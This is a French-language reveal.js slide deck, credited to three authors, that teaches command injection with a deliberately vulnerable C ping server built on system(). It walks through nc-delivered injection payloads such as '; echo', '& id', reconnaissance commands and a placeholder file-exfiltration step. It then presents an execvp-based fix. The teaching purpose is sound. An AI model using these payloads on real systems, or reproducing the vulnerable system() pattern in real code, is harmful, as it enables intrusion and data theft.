<!doctype html>
<html>
    <head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">

        <title>Command injection</title>

        <base href="../" />

        <link rel="stylesheet" href="css/reset.css">
        <link rel="stylesheet" href="css/reveal.css">
        <link rel="stylesheet" href="css/theme/black.css">

        <!-- Theme used for syntax highlighting of code -->
        <link rel="stylesheet" href="lib/css/monokai.css">

        <!-- Printing and PDF exports -->
        <script>
            var link = document.createElement( 'link' );
            link.rel = 'stylesheet';
            link.type = 'text/css';
            link.href = window.location.search.match( /print-pdf/gi ) ? 'css/print/pdf.css' : 'css/print/paper.css';
            document.getElementsByTagName( 'head' )[0].appendChild( link );
        </script>
    </head>
    <body>
        <div class="reveal">
            <div class="slides">
                <section>
                    <h1><em>Command injection</em></h1>
                    <small>Wen CHEN, Eldred HABERT, Augustin TARRALLE</small>
                    <aside class="fragment"><small>
                        Les slides sont disponibles sur <a href="https://eldred.fr/slides/">https://eldred.fr/slides</a>,
                        le code sur <a href="https://github.com/ISSOtm/command_injection">https://github.com/ISSOtm/command_injection</a>.
                    </small></aside>
                </section>
                <section>
                    <h2>K√©zako</h2>
                    <p class="fragment">La command injection consiste en l'ex√©cution de commandes shell arbitraires dans un service qui n'est pas destin√© √† fournir un shell.</p>
                    <p class="fragment">(Par exemple, obtenir un shell √† partir d'une application cens√©e fournir l'√©tat des utilisateurs)</p>
                    <p class="fragment">Ce genre de faille appara√Æt quand le programme appel√© invoque un shell avec des param√®tres pass√©s par l'utilisateur.</p>
                    <p class="fragment">Voyons un exemple.</p>
                </section>
                <section>
                    <h2>Mise en situation</h2>
                    <section>
                        <p class="fragment">Vous √™tes sysadmin.</p>
                        <p class="fragment">(Un mauvais)</p>
                        <p class="fragment">But = consulter l'√©tat du parc √† distance</p>
                    </section>
                    <section>
                        <p>Interface Web = gros donc vuln√©rable</p>
                        <p class="fragment">On va faire simple.</p>
                        <p class="fragment">Le bon vieux <strong>shell</strong> !</p>
                    </section>
                    <section>
                        <p><code>ping 192.168.42.69</code></p>
                        <p class="fragment">Sur une machine avec deux interfaces r√©seau (1 publique + 1 priv√©e)</p>
                    </section>
                    <section>
                        <p>On va pas exposer un shell entier au Web</p>
                        <p class="fragment"><strong>√áa serait stupide, non ?</strong></p>
                    </section>
                </section>
                <section>
                    <section>
                        <h2>D√©monstration</h2>
                    </section>
                    <section>
                        <pre><code class="highlight lang-c">
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;

int main() {
    char * lineptr = NULL;
    size_t size = 0;
    ssize_t readLen = getline(&lineptr, &size, stdin);

    if (readLen == -1) {
        perror("getline");
        exit(1);
    }

    char buf[size + strlen("ping ") + 1];
    sprintf(buf, "ping -c 4 %s", lineptr);
    system(buf);

    free(lineptr);
    return 0;
}
                        </code></pre>
                    </section>
                    <section>
                        <p>Serveur sur port 54321</p>
                        <p class="fragment"><code>echo "localhost" | nc &lt;ip&gt; 54321</code></p>
                        <code class="fragment"><pre>
PING localhost(localhost (::1)) 56 data bytes
64 bytes from localhost (::1): icmp_seq=1 ttl=64 time=0.015 ms
64 bytes from localhost (::1): icmp_seq=2 ttl=64 time=0.052 ms
64 bytes from localhost (::1): icmp_seq=3 ttl=64 time=0.042 ms
64 bytes from localhost (::1): icmp_seq=4 ttl=64 time=0.031 ms

--- localhost ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3040ms
rtt min/avg/max/mdev = 0.015/0.035/0.052/0.013 ms
                        </pre></code>
                    </section>
                    <section>
                        <p>Carr√©ment avec des options !</p>
                        <p class="fragment"><code>echo "-c 2 localhost" | nc &lt;ip&gt; 54321</code></p>
                        <code class="fragment"><pre>
PING localhost(localhost (::1)) 56 data bytes
64 bytes from localhost (::1): icmp_seq=1 ttl=64 time=0.015 ms
64 bytes from localhost (::1): icmp_seq=2 ttl=64 time=0.036 ms

--- localhost ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1014ms
rtt min/avg/max/mdev = 0.015/0.025/0.036/0.010 ms
                        </pre></code>
                        <p class="fragment">ü•≥</p>
                    </section>
                    <section>
                        <p class="fragment">...<span class="fragment">Qu'est-ce qu'on peut mettre dans ces options ?</span></p>
                        <p class="fragment"><code>echo "-c \$(nproc) localhost" | nc &lt;ip&gt; 54321</code></p>
                        <code class="fragment"><pre>
PING localhost(localhost (::1)) 56 data bytes
64 bytes from localhost (::1): icmp_seq=1 ttl=64 time=0.028 ms
64 bytes from localhost (::1): icmp_seq=2 ttl=64 time=0.043 ms
64 bytes from localhost (::1): icmp_seq=3 ttl=64 time=0.052 ms
64 bytes from localhost (::1): icmp_seq=4 ttl=64 time=0.021 ms
64 bytes from localhost (::1): icmp_seq=5 ttl=64 time=0.044 ms
64 bytes from localhost (::1): icmp_seq=6 ttl=64 time=0.016 ms
64 bytes from localhost (::1): icmp_seq=7 ttl=64 time=0.021 ms
64 bytes from localhost (::1): icmp_seq=8 ttl=64 time=0.016 ms

--- localhost ping statistics ---
8 packets transmitted, 8 received, 0% packet loss, time 7100ms
rtt min/avg/max/mdev = 0.016/0.030/0.052/0.013 ms
                        </pre></code>
                        <p class="fragment">OwO what's this ?</p>
                    </section>
                </section>
                <section>
                    <section>
                        <h2>Encore plus loin...</h2>
                    </section>
                    <section>
                        <p><code>echo "localhost; echo Hax0red" | nc &lt;ip&gt; 54321</code></p>
                        <code class="fragment"><pre>
PING localhost(localhost (::1)) 56 data bytes
64 bytes from localhost (::1): icmp_seq=1 ttl=64 time=0.013 ms
64 bytes from localhost (::1): icmp_seq=2 ttl=64 time=0.051 ms
64 bytes from localhost (::1): icmp_seq=3 ttl=64 time=0.027 ms
64 bytes from localhost (::1): icmp_seq=4 ttl=64 time=0.017 ms

--- localhost ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3048ms
rtt min/avg/max/mdev = 0.013/0.027/0.051/0.014 ms
Hax0red
                        </pre></code>
                    </section>
                    <section>
                        <p><code>echo "localhost >/dev/null; echo Hax0red" | nc &lt;ip&gt; 54321</code></p>
                        <code class="fragment"><pre>
&lt;d√©lai...&gt;
Hax0red
                        </pre></code>
                    </section>
                    <section>
                        <p><code>echo "localhost >/dev/null & echo Hax0red" | nc &lt;ip&gt; 54321</code></p>
                        <code class="fragment"><pre>
Hax0red
                        </pre></code>
                        <p class="fragment">On a donc expos√© un shell au Web.</p>
                        <p class="fragment"><strong>C'est stupide, non ?</strong> <span class="fragment">üòà</span></p>
                    </section>
                    <section>
                        <p><code>echo "localhost >/dev/null & id" | nc &lt;ip&gt; 54321</code></p>
                        <code class="fragment"><pre>
uid=1000(issotm) gid=1000(issotm) groups=1000(issotm),56(bumblebee)
                        </pre></code>
                        <p class="fragment">Voire carr√©ment...</p>
                        <code class="fragment"><pre>
uid=0(root) gid=0(root) groups=0(root)
                        </pre></code>
                        <p class="fragment">(On avait pr√©venu : <strong>mauvais</strong> sysadmin)</p>
                    </section>
                    <section>
                        <p>Parfait pour la reconnaissance...</p>
                        <p class="fragment"><code>echo "localhost >/dev/null & id && uname -a && pwd" | nc &lt;ip&gt; 54321</code></p>
                        <code class="fragment"><pre>
uid=1000(issotm) gid=1000(issotm) groups=1000(issotm),56(bumblebee)
Linux sheik-kitty 5.4.8-arch1-1 #1 SMP PREEMPT Sat, 04 Jan 2020 23:46:18 +0000 x86_64 GNU/Linux
/home/issotm/command_injection
                        </pre></code>
                    </section>
                    <section>
                        <p>...l'attaque...</p>
                        <p class="fragment"><code>echo "localhost >/dev/null & &lt;upload d'un fichier sur un site public comme Firefox Send&gt;" | nc &lt;ip&gt; 54321</code></p>
                        <p class="fragment">(Et pour peu qu'un petit service pareil ne soit pas logu√©, ... la discr√©tion)</p>
                    </section>
                </section>
                <section>
                    <section>
                        <h2>Se prot√©ger</h2>
                    </section>
                    <section>
                        <pre><code class="highlight lang-c">
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;

int main() {
    char * lineptr = NULL;
    size_t size = 0;
    ssize_t readLen = getline(&lineptr, &size, stdin);

    if (readLen == -1) {
        perror("getline");
        exit(1);
    }

    char buf[size + strlen("ping ") + 1];
    sprintf(buf, "ping -c 4 %s", lineptr);
    system(buf); // Invoque un shell !!

    free(lineptr);
    return 0;
}
                        </code></pre>
                    </section>
                    <section>
                        <p>Solution : <strong class="fragment">utiliser <code>exec</code></strong></p>
                        <pre class="fragment"><code class="highlight lang-c">
#include &lt;sys/types.h&gt;
#include &lt;sys/wait.h&gt;
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;unistd.h&gt;

int main() {
    char * lineptr = NULL;
    size_t size = 0;
    ssize_t readLen = getline(&lineptr, &size, stdin);

    if (readLen == -1) {
        perror("getline");
        exit(1);
    }

    // How many bytes without the optional final newline
    size_t len = strcspn(lineptr, "\n");
    char buf[len + 1];
    memcpy(buf, lineptr, len);
    buf[len] = '\0';
    free(lineptr);

    char * const args[] = {
        "ping",
        "-c",
        "4",
        buf,
        NULL
    };

    pid_t pid = fork();
    if (pid == -1) {
        perror("fork");
    } else if (pid == 0) {
        execvp("ping", args);
    } else {
        waitpid(pid, NULL, 0);
    }
}

                        </code></pre>
                    </section>
                </section>
                <section>
                    <h2>Conclusion</h2>
                    <p class="fragment">Solutions possibles :</p>
                    <ul>
                        <li class="fragment">√âviter d'utiliser le shell si c'est possible</li>
                        <li class="fragment">Utiliser <code>exec()</code> au lieu de <code>system()</code></li>
                        <li class="fragment">Utiliser des appels syst√®mes au lieu d'appeler des programmes</li>
                        <li class="fragment">Comme pour tout : <strong>ne jamais faire confiance aux donn√©es de l'utilisateur</strong></li>
                        <li class="fragment">Ne <strong>jamais</strong> exposer un programme tournant en tant que <code>root</code> √† l'Internet</li>
                    </ul>
                </section>
            </div>
        </div>

        <script src="js/reveal.js"></script>

        <script>
            // More info about config & dependencies:
            // - https://github.com/hakimel/reveal.js#configuration
            // - https://github.com/hakimel/reveal.js#dependencies
            Reveal.initialize({
                dependencies: [
                    { src: 'plugin/markdown/marked.js' },
                    { src: 'plugin/markdown/markdown.js' },
                    { src: 'plugin/notes/notes.js', async: true },
                    { src: 'plugin/highlight/highlight.js', async: true }
                ]
            });
        </script>
    </body>
</html>
